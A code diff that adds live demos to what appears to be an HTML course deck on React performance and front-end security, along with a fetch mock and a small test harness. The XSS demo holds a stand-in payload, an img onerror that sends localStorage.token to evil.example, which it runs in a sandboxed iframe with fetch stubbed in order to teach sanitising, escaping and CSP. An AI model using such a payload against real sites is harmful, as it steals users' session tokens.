+  if (!jobs) return <p>Loading jobs…</p>;
+  return (
+    <div className="card row">
+      {jobs.map((job) => (
+        <button key={job.id} aria-pressed={picked?.id === job.id} onClick={() => (setPicked(job), setSent(false))}>
+          {job.title}
+        </button>
+      ))}
+      {picked && (
+        <button disabled={sent} onClick={() => apply(picked)}>
+          {sent ? 'Application sent ✓' : bugs.iconOnly ? '➜' : 'Apply now'}
+        </button>
+      )}
+    </div>
+  );
+}
+</script>
+<script type="text/plain" data-sbx-file="server.ts" data-sbx-group="testing">
+// A stand-in for MSW, shaped like it: handlers, server.use() for one test, resetHandlers()
+// after it, and an error for any request nobody handles. MSW intercepts in a service
+// worker (or in Node); the preview can't register one, so this replaces fetch instead.
+type Resolver = (request: Request) => Response | Promise<Response>;
+type Handler = { method: string; path: string; resolve: Resolver };
+
+export const http = {
+  get: (path: string, resolve: Resolver): Handler => ({ method: 'GET', path, resolve }),
+  post: (path: string, resolve: Resolver): Handler => ({ method: 'POST', path, resolve }),
+};
+
+export const HttpResponse = {
+  json: (body: unknown, init?: ResponseInit) =>
+    new Response(JSON.stringify(body), { ...init, headers: { 'content-type': 'application/json' } }),
+};
+
+function setupServer(...handlers: Handler[]) {
+  let extra: Handler[] = [];
+  const real = window.fetch;
+  return {
+    listen() {
+      window.fetch = async (input, init) => {
+        const request = new Request(new URL(String(input instanceof Request ? input.url : input), 'https://rasmi.test'), init);
+        const path = new URL(request.url).pathname;
+        const handler = [...extra, ...handlers].find((h) => h.method === request.method && h.path === path);
+        if (!handler) throw new Error(`No handler for ${request.method} ${path}`);
+        await new Promise((r) => setTimeout(r, 30)); // the network is never instant
+        return handler.resolve(request);
+      };
+    },
+    use: (...h: Handler[]) => void (extra = [...h, ...extra]),
+    resetHandlers: () => void (extra = []),
+    close: () => void (window.fetch = real),
+  };
+}
+
+const jobs = [
+  { id: 1, title: 'React Engineer' },
+  { id: 2, title: 'UI Engineer' },
+];
+
+export const server = setupServer(
+  http.get('/api/jobs', () => HttpResponse.json(jobs)),
+  http.post('/api/applications', () => HttpResponse.json({ ok: true }, { status: 201 })),
+);
+</script>
+<script type="text/plain" data-sbx-file="testkit.ts" data-sbx-group="testing">
+import type { ReactNode } from 'react';
+import { createRoot, type Root } from 'react-dom/client';
+import { server } from './server';
+
+// Just enough of Vitest, Testing Library's render() and jest-dom to run jobs.test.tsx in
+// the preview.
+type Case = { name: string; fn: () => void | Promise<void> };
+export type Result = { name: string; ok: boolean; ms: number; error?: string };
+
+const cases: Case[] = [];
+let mounted: { root: Root; host: HTMLElement }[] = [];
+
+export function test(name: string, fn: Case['fn']) {
+  cases.push({ name, fn });
+}
+
+export function render(ui: ReactNode) {
+  const host = document.body.appendChild(document.createElement('div'));
+  const root = createRoot(host);
+  root.render(ui);
+  mounted.push({ root, host });
+  return host;
+}
+
+const show = (el: Element) => `<${el.tagName.toLowerCase()}> “${el.textContent}”`;
+
+export function expect(el: Element) {
+  const check = (ok: boolean, what: string) => {
+    if (!ok) throw new Error(`expected ${show(el)} ${what}`);
+  };
+  return {
+    toBeDisabled: () => check((el as HTMLButtonElement).disabled, 'to be disabled'),
+    toBeInTheDocument: () => check(el.isConnected, 'to be in the document'),
+    toHaveTextContent: (re: RegExp) => check(re.test(el.textContent ?? ''), `to have text ${re}`),
+  };
+}
+
+// beforeAll listen, afterEach clean up and reset, afterAll close: the setup file's job.
+export async function run(): Promise<Result[]> {
+  const results: Result[] = [];
+  server.listen();
+  for (const c of cases) {
+    const t = performance.now();
+    try {
+      await c.fn();
+      results.push({ name: c.name, ok: true, ms: Math.round(performance.now() - t) });
+    } catch (e) {
+      // Testing Library appends the whole DOM to its message; the first paragraph is the news.
+      const error = String(e instanceof Error ? e.message : e).split('\n\n')[0];
+      results.push({ name: c.name, ok: false, ms: Math.round(performance.now() - t), error });
+    } finally {
+      mounted.forEach(({ root, host }) => (root.unmount(), host.remove()));
+      mounted = [];
+      server.resetHandlers();
+    }
+  }
+  server.close();
+  return results;
+}
+</script>
+<script>
+/* Step player — see the .anim block in the stylesheet for the vocabulary. Each player
+   restarts whenever its slide opens; R replays every player on the current slide. With
+   reduced motion, or for print, it jumps straight to the settled frame. */
+(function(){
+  var still = window.matchMedia('(prefers-reduced-motion: reduce)');
+  var players = [];
+  document.querySelectorAll('.anim[data-at]').forEach(function(root){
+    var at = root.dataset.at.split(',').map(Number), n = at.length, timers = [];
+    var ins  = [].slice.call(root.querySelectorAll('[data-in]'));
+    var outs = [].slice.call(root.querySelectorAll('[data-out]'));
+    var hls  = [].slice.call(root.querySelectorAll('[data-hl]')).map(function(el){
+      return { el:el, at:el.dataset.hl.split(/\s+/).map(Number) };
+    });
+    var says = [].slice.call(root.querySelectorAll('.anim-say i'));
+    var steps = [].slice.call(root.querySelectorAll('.anim-step')), cur = n;
+
+    function set(k){
+      cur = k;
+      for (var j = 1; j <= n; j++) root.classList.toggle('s' + j, j <= k);
+      root.dataset.step = k;
+      ins.forEach(function(el){ el.classList.toggle('in', k >= +el.dataset.in); });
+      outs.forEach(function(el){ el.classList.toggle('out', k >= +el.dataset.out); });
+      hls.forEach(function(h){ h.el.classList.toggle('lit', h.at.indexOf(k) >= 0); });
+      says.forEach(function(el, j){ el.classList.toggle('on', j === k - 1); });
+      steps.forEach(function(b){
+        var d = +b.dataset.d;
+        b.setAttribute('aria-disabled', String(d < 0 ? k <= 0 : k >= n));
+      });
+    }
+    function go(d){
+      timers.forEach(clearTimeout); timers = [];
+      set(Math.max(0, Math.min(n, cur + d)));
+    }
+    function settle(){ timers.forEach(clearTimeout); timers = []; set(n); }
+    function play(){
+      if (still.matches) return settle();
+      timers.forEach(clearTimeout); timers = [];
+      root.classList.add('rs'); set(0); void root.offsetWidth; root.classList.remove('rs');
+      at.forEach(function(ms, j){ timers.push(setTimeout(function(){ set(j + 1); }, ms)); });
+    }
+    set(n);
+    root.classList.add('live');
+
+    var btn = root.querySelector('.anim-replay');
+    if (btn) btn.addEventListener('click', play);
+    steps.forEach(function(b){ b.addEventListener('click', function(){ go(+b.dataset.d); }); });
+    // A press on a player button must not also turn the slide.
+    (btn ? [btn] : []).concat(steps).forEach(function(b){
+      ['click','pointerdown'].forEach(function(t){
+        b.addEventListener(t, function(e){ e.stopPropagation(); });
+      });
+    });
+
+    var slide = root.closest('.slide'), wasOn = slide.classList.contains('on');
+    if (wasOn) play();
+    new MutationObserver(function(){
+      var isOn = slide.classList.contains('on');
+      if (isOn && !wasOn) play();
+      if (!isOn && wasOn) settle();
+      wasOn = isOn;
+    }).observe(slide, { attributes:true, attributeFilter:['class'] });
+    players.push({ slide:slide, play:play, settle:settle });
+  });
+
+  document.addEventListener('keydown', function(e){
+    if (e.key.toLowerCase() !== 'r' || e.metaKey || e.ctrlKey || e.altKey) return;
+    if (/^(INPUT|TEXTAREA|SELECT)$/.test(e.target.tagName)) return;
+    players.forEach(function(p){ if (p.slide.classList.contains('on')) p.play(); });
+  });
+  window.addEventListener('beforeprint', function(){ players.forEach(function(p){ p.settle(); }); });
+})();
+</script>
+<script>
+/* Live demos — see the .demo block in the stylesheet. The deck turns slides on any click
+   and on Space or the arrow keys, so a demo keeps its own clicks, and keeps the keys that
+   belong to it: anything typed into an input, plus Space, Enter, Tab and Escape on its
+   controls. Arrow keys on a demo button still turn the slide. */
+(function(){
+  document.querySelectorAll('.demo').forEach(function(el){
+    ['click','pointerdown'].forEach(function(t){ el.addEventListener(t, function(e){ e.stopPropagation(); }); });
+    el.addEventListener('keydown', function(e){
+      var typing = /^(INPUT|TEXTAREA|SELECT)$/.test(e.target.tagName) || e.target.isContentEditable;
+      if (typing || e.key === ' ' || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Escape') e.stopPropagation();
+    });
+  });
+
+  // Runs open() each time the demo's slide opens and close() each time it leaves.
+  function watch(el, open, close){
+    var s = el.closest('.slide'), was = s.classList.contains('on');
+    if (was) open();
+    new MutationObserver(function(){
+      var is = s.classList.contains('on');
+      if (is && !was) open();
+      if (!is && was && close) close();
+      was = is;
+    }).observe(s, { attributes:true, attributeFilter:['class'] });
+  }
+  function again(el, cls){ el.classList.remove(cls); void el.offsetWidth; el.classList.add(cls); }
+  function esc(s){ return String(s).replace(/[&<>"]/g, function(c){ return { '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;' }[c]; }); }
+  function k(root, name){ return root.querySelector('[data-k="' + name + '"]'); }
+  window.cxDemo = { watch:watch, again:again, esc:esc, k:k };
+  /* L1a · one tap, measured the way INP measures it: from the input to the next frame */
+  (function(){
+    var root = document.getElementById('demo-inp'), mark = document.getElementById('inp-mark');
+    if (!root || !mark) return;
+    var pending = null, po = null;
+    // The bar's scale: good is 300–580, needs improvement 580–800, poor 800 onwards.
+    function x(ms){
+      if (ms <= 200) return 300 + ms / 200 * 280;
+      if (ms <= 500) return 580 + (ms - 200) / 300 * 220;
+      return Math.min(996, 800 + (ms - 500) / 500 * 196);
+    }
+    function show(ms){
+      ms = Math.round(ms);
+      var band = ms <= 200 ? 'good' : ms <= 500 ? 'mid' : 'bad', m = k(root,'ms');
+      m.textContent = ms + ' ms';
+      m.className = band;
+      again(m, 'bump');
+      k(root,'say').textContent = band === 'good' ? 'good: the next frame came in time'
+        : band === 'mid' ? 'needs improvement: the handler held the frame back' : 'poor: the page froze under the tap';
+      mark.style.transform = 'translateX(' + x(ms).toFixed(1) + 'px)';
+      mark.classList.add('on');
+    }
+    // Chrome's Event Timing entries are what INP is built from. Where they're missing,
+    // fall back to timing the next frame by hand.
+    try {
+      if ((PerformanceObserver.supportedEntryTypes || []).indexOf('event') >= 0) {
+        po = new PerformanceObserver(function(list){
+          list.getEntries().forEach(function(en){
+            if (pending && en.interactionId && en.startTime >= pending.t0 - 2) pending.ev = Math.max(pending.ev || 0, en.duration);
+          });
+        });
+        po.observe({ type: 'event', durationThreshold: 16, buffered: false });
+      }
+    } catch (e) { po = null; }
+    root.addEventListener('click', function(e){
+      var b = e.target.closest('[data-w]'); if (!b) return;
+      var p = pending = { t0: e.timeStamp }, end = performance.now() + +b.dataset.w;
+      root.querySelectorAll('[data-w]').forEach(function(x){ x.classList.toggle('on', x === b); });
+      while (performance.now() < end) {}           // the handler's work, on the main thread
+      requestAnimationFrame(function(){
+        setTimeout(function(){
+          p.frame = performance.now() - p.t0;
+          setTimeout(function(){ if (pending === p) show(p.ev || p.frame); }, po ? 300 : 0);
+        }, 0);
+      });
+    });
+    watch(root, function(){
+      pending = null;
+      mark.classList.remove('on');
+      k(root,'ms').textContent = '–'; k(root,'ms').className = '';
+      k(root,'say').textContent = '';
+      root.querySelectorAll('[data-w]').forEach(function(x){ x.classList.remove('on'); });
+    });
+  })();
+
+  /* L2a · lazy() the editor, narrow the locales: main.js shrinks */
+  (function(){
+    var fig = document.getElementById('fx-bundle');
+    if (!fig) return;
+    // What each fix takes out of main.js, [minified, gzip] in KB. With both, gzip lands
+    // on the 102 KB in the budget table at the end of the module.
+    var CUT = { editor: [300, 90], locale: [60, 22] };
+    var TXT = {
+      editor: [['Rich-text editor', '300 KB · used on /post-job only'], ['post-job.js · its own chunk', 'lazy(): loads on /post-job only']],
+      locale: [['date formatting, every locale', '72 KB'], ['date formatting, two locales', '12 KB']]
+    };
+    var on = {}, head = fig.querySelector('[data-k="main"]'), hint = fig.querySelector('[data-k="hint"]');
+    function paint(){
+      var min = 712, gz = 214;
+      Object.keys(CUT).forEach(function(n){
+        var g = fig.querySelector('[data-box="' + n + '"]'), t = g.querySelectorAll('text'), s = TXT[n][on[n] ? 1 : 0];
+        g.classList.toggle(n === 'editor' ? 'out' : 'cut', !!on[n]);
+        g.setAttribute('aria-pressed', String(!!on[n]));
+        t[0].textContent = s[0]; t[1].textContent = s[1];
+        if (on[n]) { min -= CUT[n][0]; gz -= CUT[n][1]; }
+      });
+      head.textContent = 'main.js · ' + min + ' KB minified · ' + gz + ' KB gzip · loaded on every page';
+      head.style.fill = min < 712 ? '#34D399' : '';
+      hint.textContent = on.editor || on.locale ? 'click again to undo' : 'click a box to fix it';
+    }
+    function flip(g){ on[g.dataset.box] = !on[g.dataset.box]; paint(); }
+    fig.addEventListener('click', function(e){
+      var g = e.target.closest('[data-box]'); if (!g) return;
+      e.stopPropagation(); flip(g);
+    });
+    fig.addEventListener('pointerdown', function(e){ if (e.target.closest('[data-box]')) e.stopPropagation(); });
+    fig.addEventListener('keydown', function(e){
+      var g = e.target.closest('[data-box]'); if (!g || (e.key !== 'Enter' && e.key !== ' ')) return;
+      e.preventDefault(); e.stopPropagation(); flip(g);
+    });
+    watch(fig, function(){ on = {}; paint(); });
+  })();
+
+  /* L3 · memo compares every prop with Object.is: click a job, count what renders */
+  (function(){
+    var root = document.getElementById('demo-memo'), fig = document.getElementById('fx-prof');
+    if (!root || !fig) return;
+    var N = 120, prev = [], selected = 0, mode = 'arrow';
+    function setSelectedId(id){ selected = id; }      // a state setter: the same function every render
+    function spin(ms){ var end = performance.now() + ms; while (performance.now() < end) {} }
+    function same(a, b){ return Object.keys(a).every(function(key){ return Object.is(a[key], b[key]); }); }
+    // One commit, timed for real: App and JobList always render, and each JobCard renders
+    // unless memo finds every prop the same as last time. A card costs 0.3 ms to render.
+    function commit(){
+      var t = performance.now(), n = 0, next = [];
+      spin(2.5);
+      for (var i = 0; i < N; i++)
+        next.push({ job: i, isSelected: i === selected,
+                    onSelect: mode === 'arrow' ? function(id){ setSelectedId(id); } : setSelectedId });
+      next.forEach(function(p, i){ if (!prev[i] || !same(prev[i], p)) { n++; spin(0.3); } });
+      prev = next;
+      return { n: n, ms: performance.now() - t };
+    }
+    function pick(m){
+      mode = m;
+      root.querySelectorAll('[data-p]').forEach(function(b){ b.classList.toggle('on', b.dataset.p === m); });
+      prev = []; commit();                            // the code changed: a fresh mount
+      k(root,'n').textContent = '–'; k(root,'n').className = '';
+      k(root,'ms').textContent = '–'; k(root,'ms').className = '';
+      fig.classList.remove('see-before', 'see-after');
+    }
+    root.addEventListener('click', function(e){
+      var b = e.target.closest('[data-p]');
+      if (b) return pick(b.dataset.p);
+      if (!e.target.closest('[data-act="click"]')) return;
+      selected = (selected + 1) % N;
+      var r = commit(), all = r.n === N;
+      k(root,'n').textContent = r.n + ' of ' + N; k(root,'n').className = all ? 'bad' : 'good';
+      k(root,'ms').textContent = r.ms.toFixed(1) + ' ms'; k(root,'ms').className = all ? 'bad' : 'good';
+      again(k(root,'ms'), 'bump');
+      fig.classList.toggle('see-before', all); fig.classList.toggle('see-after', !all);
+    });
+    watch(root, function(){ selected = 0; pick('arrow'); });
+  })();
+
+  /* L5a · the same employer HTML, three ways into a page */
+  (function(){
+    var root = document.getElementById('demo-xss');
+    if (!root) return;
+    var PAYLOAD = '<img src=x onerror="fetch(\'//evil.example?t=\'+localStorage.token)">';
+    var frame = null, timer = null, run = 0;
+    // An allowlist sanitiser: the idea DOMPurify implements, cut down to this payload's size.
+    function sanitize(html){
+      var doc = new DOMParser().parseFromString('<body>' + html, 'text/html');
+      [].slice.call(doc.body.querySelectorAll('*')).forEach(function(el){
+        if (!/^(B|I|EM|STRONG|P|BR|UL|OL|LI|A|IMG)$/.test(el.tagName)) return el.remove();
+        [].slice.call(el.attributes).forEach(function(a){
+          if (!/^(href|src|alt|title)$/i.test(a.name) || /^\s*javascript:/i.test(a.value)) el.removeAttribute(a.name);
+        });
+      });
+      return doc.body.innerHTML;
+    }
+    // A throwaway page with a token in localStorage, and a fetch that reports instead of sending.
+    function page(body){
+      return '<!doctype html><meta charset="utf-8"><scr' + 'ipt>' +
+        'Object.defineProperty(window,"localStorage",{value:{token:"rasmi-session-7f3a"}});' +
+        'window.fetch=function(u){parent.postMessage({xss:String(u)},"*");return new Promise(function(){});};' +
+        '<\/script><body>' + body;
+    }
+    function say(text, cls){ var h = k(root,'out'); h.textContent = text; h.className = 'demo-hint ' + (cls || ''); }
+    function render(m){
+      var mine = ++run;
+      clearTimeout(timer);
+      root.querySelectorAll('[data-m]').forEach(function(b){ b.classList.toggle('on', b.dataset.m === m); });
+      var body = m === 'raw' ? PAYLOAD : m === 'clean' ? sanitize(PAYLOAD) : esc(PAYLOAD);
+      if (frame) frame.remove();
+      frame = document.createElement('iframe');
+      frame.className = 'ghost'; frame.setAttribute('aria-hidden', 'true'); frame.tabIndex = -1;
+      frame.setAttribute('sandbox', 'allow-scripts');
+      frame.srcdoc = page(body);
+      root.appendChild(frame);
+      say('rendering…');
+      timer = setTimeout(function(){
+        if (mine !== run) return;
+        say(m === 'clean' ? '✓ Sanitised to ' + body + ': the image stays, onerror is gone, nothing ran.'
+          : m === 'text' ? '✓ Shown as text. The browser never parsed it as HTML, so nothing ran.'
+          : 'Nothing ran.', 'ok');
+      }, 1200);
+    }
+    addEventListener('message', function(e){
+      if (!frame || e.source !== frame.contentWindow || !e.data || !e.data.xss) return;
+      clearTimeout(timer);
+      say('✗ The onerror ran: fetch(\'' + e.data.xss + '\'). The token just left for evil.example.', 'no');
+    });
+    root.addEventListener('click', function(e){ var b = e.target.closest('[data-m]'); if (b) render(b.dataset.m); });
+    watch(root, function(){
+      run++; clearTimeout(timer);
+      if (frame) { frame.remove(); frame = null; }
+      root.querySelectorAll('[data-m]').forEach(function(b){ b.classList.remove('on'); });
+      say('');
+    });
+  })();
+
+  /* L5b · the payload runs: what can it read? */
+  (function(){
+    var root = document.getElementById('demo-steal'), tbl = document.getElementById('tbl-store');
+    if (!root || !tbl) return;
+    // [the table row it belongs to, what the payload gets, ok or no]
+    var S = {
+      ls:     [1, '✗ localStorage.token → "rasmi-session-7f3a". One fetch and it’s gone, replayed from the attacker’s machine until it expires.', 'no'],
+      mem:    [2, '✗ Readable too, if the payload can reach the variable, but only while the tab is open. Keep it short-lived.', 'no'],
+      cookie: [3, '✓ document.cookie never contains an HttpOnly cookie. The payload can still call the API from this tab, so stop the XSS first.', 'ok']
+    };
+    var rows = tbl.querySelectorAll('tr');
+    function pick(s){
+      root.querySelectorAll('[data-s]').forEach(function(b){ b.classList.toggle('on', b.dataset.s === s); });
+      rows.forEach(function(r, i){ r.classList.toggle('hl', !!s && i === S[s][0]); });
+      var h = k(root,'why');
+      h.textContent = s ? S[s][1] : '';
+      h.className = 'demo-hint ' + (s ? S[s][2] : '');
+    }
+    root.addEventListener('click', function(e){ var b = e.target.closest('[data-s]'); if (b) pick(b.dataset.s); });
+    watch(root, function(){ pick(null); });
+  })();
+
+  /* L5c · the same injected page, with and without the policy */
+  (function(){
+    var root = document.getElementById('demo-csp');
+    if (!root) return;
+    var POLICY = "script-src 'nonce-R4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'";
+    // Each script reports when it runs; the page reports each violation by directive.
+    var KEY = { 'script-src-elem': 'inline', 'script-src-attr': 'onerror' };
+    var NAME = { nonce: 'nonce script', inline: 'injected <script>', onerror: 'onerror=' };
+    var frame = null, timer = null, got = {};
+    function page(csp){
+      return '<!doctype html><meta charset="utf-8">' +
+        (csp ? '<meta http-equiv="Content-Security-Policy" content="' + POLICY + '">' : '') +
+        '<scr' + 'ipt nonce="R4nd0m">parent.postMessage({csp:"nonce"},"*");' +
+        'document.addEventListener("securitypolicyviolation",function(e){parent.postMessage({csp:"blocked",d:e.effectiveDirective},"*");});<\/script>' +
+        '<p>Job description</p><scr' + 'ipt>parent.postMessage({csp:"inline"},"*")<\/script>' +
+        '<img src="x" onerror="parent.postMessage({csp:\'onerror\'},\'*\')">';
+    }
+    function chip(n, state){
+      var el = k(root, n);
+      el.textContent = NAME[n] + (state === 'ran' ? ' ✓ ran' : state === 'blocked' ? ' ✗ blocked' : state === 'none' ? ' · didn’t run' : ' ·');
+      el.className = 'dom' + (state === 'ran' ? (n === 'nonce' ? ' ok' : ' no') : state === 'blocked' ? ' ok' : '');
+    }
+    function load(c){
+      clearTimeout(timer); got = {};
+      root.querySelectorAll('[data-c]').forEach(function(b){ b.classList.toggle('on', b.dataset.c === c); });
+      Object.keys(NAME).forEach(function(n){ chip(n); });
+      if (frame) frame.remove();
+      frame = document.createElement('iframe');
+      frame.className = 'ghost'; frame.setAttribute('aria-hidden', 'true'); frame.tabIndex = -1;
+      frame.setAttribute('sandbox', 'allow-scripts');
+      frame.srcdoc = page(c === 'on');
+      root.appendChild(frame);
+      timer = setTimeout(function(){ Object.keys(NAME).forEach(function(n){ if (!got[n]) chip(n, 'none'); }); }, 1500);
+    }
+    addEventListener('message', function(e){
+      if (!frame || e.source !== frame.contentWindow || !e.data || !e.data.csp) return;
+      var n = e.data.csp === 'blocked' ? KEY[e.data.d] : e.data.csp;
+      if (!n) return;
+      got[n] = e.data.csp === 'blocked' ? 'blocked' : 'ran';
+      chip(n, got[n]);
+    });
+    root.addEventListener('click', function(e){ var b = e.target.closest('[data-c]'); if (b) load(b.dataset.c); });
+    watch(root, function(){
+      clearTimeout(timer);
+      if (frame) { frame.remove(); frame = null; }
+      root.querySelectorAll('[data-c]').forEach(function(b){ b.classList.remove('on'); });
+      Object.keys(NAME).forEach(function(n){ chip(n); });
+    });
+  })();
+})();
 </script>
 <!--catalyst-brand:copy-->
 <script>
